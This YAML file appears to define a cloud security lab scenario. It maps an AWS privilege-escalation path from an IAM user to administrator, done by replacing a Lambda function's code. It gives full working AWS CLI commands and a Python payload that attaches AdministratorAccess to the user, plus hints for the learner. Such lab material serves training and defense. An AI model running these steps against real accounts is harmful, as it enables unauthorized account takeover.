attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has lambda:UpdateFunctionCode, lambda:AddPermission, and
        lambda:InvokeFunction permissions on the target Lambda function. The target
        function runs under an execution role with AdministratorAccess.

    - id: target-lambda
      label: "Target Lambda"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-005-to-admin-target-lambda"
      description: >
        This Lambda function runs benign code but its execution role has AdministratorAccess.
        By replacing the function code with a malicious payload and granting yourself
        invocation rights, you can execute arbitrary code under the privileged role.

    - id: lambda-exec-role
      label: "Lambda Exec Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-005-to-admin-lambda-exec-role"
      description: >
        This IAM role is the execution role of the target Lambda function and has
        AdministratorAccess attached. When you invoke the malicious Lambda payload,
        the code runs under this role's identity, giving you full administrative
        access to the AWS account through the attached AdministratorAccess policy.

  edges:
    - from: starting-principal
      to: target-lambda
      label: "lambda:UpdateFunctionCode"
      description: >
        Replace the existing Lambda function code with a malicious payload. The payload
        uses the function's execution role (which has AdministratorAccess) to attach
        the AdministratorAccess policy to the starting user.
      hints:
        - "You can modify the code of existing Lambda functions."
        - "Look for Lambda functions whose execution roles have elevated permissions."
        - "Browse to https://pathfinding.cloud/paths/lambda-005 for technique details."
      commands:
        - description: "Get the current function details including handler name and execution role"
          command: "aws lambda get-function --function-name pl-prod-lambda-005-to-admin-target-lambda --query '{Handler:Configuration.Handler,Role:Configuration.Role}'"
        - description: "Create malicious Python payload (lambda_function.py)"
          command: "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(\n        UserName=event['username'],\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'statusCode': 200, 'body': 'Done'}\nEOF"
        - description: "Package the malicious code"
          command: "cd /tmp && zip malicious_lambda.zip lambda_function.py"
        - description: "Update the Lambda function with the malicious payload"
          command: "aws lambda update-function-code --function-name pl-prod-lambda-005-to-admin-target-lambda --zip-file fileb:///tmp/malicious_lambda.zip"

    - from: target-lambda
      to: target-lambda
      label: "lambda:AddPermission"
      description: >
        Add a resource-based policy statement to the Lambda function granting the
        starting user permission to invoke it. This step is required because the
        function's resource policy may initially block the starting user from invoking it.
      hints:
        - "You may need to grant yourself invocation rights before you can trigger the function."
        - "Inspect this function's execution role to understand what permissions it has."
        - "Use lambda:AddPermission to grant yourself invocation rights if the resource policy blocks you."
      commands:
        - description: "Grant self-invocation permission via resource-based policy"
          command: "aws lambda add-permission --function-name pl-prod-lambda-005-to-admin-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-admin-starting-user"

    - from: target-lambda
      to: lambda-exec-role
      label: "lambda:InvokeFunction"
      description: >
        Invoke the malicious Lambda function, which executes under the privileged
        execution role and attaches AdministratorAccess to the starting user.
      commands:
        - description: "Invoke the malicious Lambda to attach AdministratorAccess to the starting user"
          command: "aws lambda invoke --function-name pl-prod-lambda-005-to-admin-target-lambda --payload '{\"username\": \"pl-prod-lambda-005-to-admin-starting-user\"}' /tmp/lambda-response.json && cat /tmp/lambda-response.json"
        - description: "Verify administrator access has been granted"
          command: "aws iam list-attached-user-policies --user-name pl-prod-lambda-005-to-admin-starting-user"
